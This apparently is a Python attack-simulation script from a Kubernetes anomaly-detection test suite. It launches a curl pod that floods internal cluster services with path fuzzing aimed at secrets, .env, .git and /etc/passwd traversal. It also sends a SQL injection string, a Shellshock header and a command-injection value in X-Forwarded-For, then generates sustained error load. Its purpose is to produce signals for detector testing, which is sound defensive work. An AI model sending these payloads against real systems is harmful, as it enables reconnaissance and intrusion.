"""
s8_http_error_storm.py — T1190 Exploit Public-Facing Application
================================================================

Симулирует фазу разведки и эксплуатации публичного приложения:
1. Шквал HTTP ошибок (404/500) — сканирование путей, fuzzing
2. Попытки path traversal и command injection
3. Резкий рост error_rate в логах приложения

Реализация без реального RCE: pod с curl/wrk делает
аномальный HTTP трафик к сервисам кластера.

Ожидаемые сигналы:
  Logs:     feat_error_count >> базлайн (сотни 404/500 за минуту)
            feat_unseen_templates (новые error patterns)
            feat_error_ratio >> 0.5
  Metrics:  feat_container_restarts (если приложение падает от нагрузки)
            feat_pods_not_ready (если overload → crashloop)
  Network:  feat_external_ingress (запросы снаружи)
            feat_syn_count (много новых соединений)
  Audit:    feat_total_events рост (K8s реагирует на перегрузку)
"""

import subprocess
import time

POD_NAME = "attack-http-fuzzer"

# Сервисы которые будем "атаковать" HTTP запросами
# Используем только внутренние сервисы кластера
HTTP_TARGETS = [
    "http://monitoring-kube-prometheus-prometheus.monitoring.svc.cluster.local:9090",
    "http://signoz-frontend.signoz.svc.cluster.local:3301",
    "http://kafka-ui.kafka.svc.cluster.local:8080",
]

# Пути для fuzzing (имитация directory traversal и path enumeration)
FUZZ_PATHS = [
    "/admin", "/api/v1/secret", "/config", "/.env",
    "/api/v1/namespaces/kube-system/secrets",
    "/metrics", "/actuator/env", "/actuator/heapdump",
    "/../../../etc/passwd", "/api/v1/pods?limit=500",
    "/wp-admin", "/phpinfo.php", "/.git/config",
    "/api/v1/namespaces/default/secrets",
    "/swagger-ui", "/v2/keys", "/console",
]

POD_MANIFEST = f"""
apiVersion: v1
kind: Pod
metadata:
  name: {POD_NAME}
  labels:
    app: {POD_NAME}
    attack-scenario: s8-http-error-storm
spec:
  restartPolicy: Never
  containers:
  - name: fuzzer
    image: curlimages/curl:latest
    command:
    - /bin/sh
    - -c
    - |
      echo "[attack] HTTP error storm started — simulating web app exploitation"

      # Целевые сервисы
      TARGETS="{' '.join(HTTP_TARGETS[:2])}"

      echo "[attack] Phase 1: Path enumeration / directory fuzzing..."
      for target in $TARGETS; do
        echo "  Fuzzing: $target"
        for path in /admin /api/v1/secret /config /.env /../../../etc/passwd \
                    /actuator/env /actuator/heapdump /wp-admin /.git/config \
                    /swagger-ui /v2/keys /console /metrics /debug/pprof; do
          curl -s -o /dev/null -w "%{{http_code}} $target$path\\n" \
               --connect-timeout 2 --max-time 3 \
               "$target$path" 2>/dev/null || true
        done
      done

      echo "[attack] Phase 2: Rapid fire — high error rate generation..."
      for i in $(seq 1 200); do
        for target in $TARGETS; do
          curl -s -o /dev/null --connect-timeout 1 --max-time 2 \
               -H "User-Agent: Mozilla/5.0 sqlmap/1.0" \
               "$target/api/v1/?id=1' OR 1=1--" 2>/dev/null || true
        done
        sleep 0.1
      done

      echo "[attack] Phase 3: Command injection attempts in headers..."
      for target in $TARGETS; do
        curl -s -o /dev/null --connect-timeout 2 --max-time 3 \
             -H "X-Forwarded-For: 127.0.0.1; cat /etc/passwd" \
             -H "User-Agent: () {{ :; }}; echo vulnerable" \
             -H "Authorization: Bearer AAAAA.BBBBB.CCCCC" \
             "$target/api/execute" 2>/dev/null || true
      done

      echo "[attack] Phase 4: Sustained load to trigger app errors..."
      END=$(($(date +%s) + 120))
      while [ $(date +%s) -lt $END ]; do
        for target in $TARGETS; do
          curl -s -o /dev/null --connect-timeout 1 --max-time 2 \
               "$target/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)" 2>/dev/null || true
        done
        sleep 0.2
      done

      echo "[attack] HTTP error storm complete."
    resources:
      requests:
        cpu: "200m"
        memory: "64Mi"
"""

ATTACK_DURATION = 240  # ~4 минуты


def run(namespace: str = "default", dry_run: bool = False):
    print(f"[S8] Deploying HTTP fuzzer pod '{POD_NAME}' in namespace '{namespace}'")
    print(f"     Targets: {HTTP_TARGETS}")
    print(f"     Duration: {ATTACK_DURATION}s")

    if dry_run:
        print("[DRY] Would create curl pod doing path fuzzing + rapid HTTP errors")
        print(f"      Targets: {HTTP_TARGETS}")
        return

    _apply(POD_MANIFEST, namespace)

    print("[S8] Waiting for pod to start...")
    _wait_for_phase(POD_NAME, namespace, "Running", timeout=90)

    print(f"[S8] Fuzzer running. Duration: {ATTACK_DURATION}s")
    print(f"     Watch: kubectl logs -f {POD_NAME} -n {namespace}")

    _wait_for_phase(POD_NAME, namespace, "Succeeded", timeout=ATTACK_DURATION)

    print("[S8] HTTP storm complete. Cleaning up...")
    cleanup(namespace)


def cleanup(namespace: str = "default"):
    print(f"[S8] Deleting pod {POD_NAME}...")
    subprocess.run(
        ["kubectl", "delete", "pod", POD_NAME, "-n", namespace,
         "--ignore-not-found", "--grace-period=0", "--force"],
        capture_output=True
    )
    print("[S8] Cleanup done.")


def _apply(manifest: str, namespace: str):
    result = subprocess.run(
        ["kubectl", "apply", "-n", namespace, "-f", "-"],
        input=manifest.encode(), capture_output=True
    )
    if result.returncode != 0:
        raise RuntimeError(f"kubectl apply failed: {result.stderr.decode()}")
    print(f"     {result.stdout.decode().strip()}")


def _wait_for_phase(name: str, namespace: str, phase: str, timeout: int = 90):
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = subprocess.run(
            ["kubectl", "get", "pod", name, "-n", namespace,
             "-o", "jsonpath={.status.phase}"],
            capture_output=True, text=True
        )
        current = result.stdout.strip()
        if current == phase:
            print(f"     Phase: {phase} ✓")
            return
        if current == "Failed":
            print("     ⚠️  Pod failed")
            return
        print(f"     Phase: {current or 'Pending'}...")
        time.sleep(8)
    print(f"     ⚠️  Timeout waiting for {phase}")
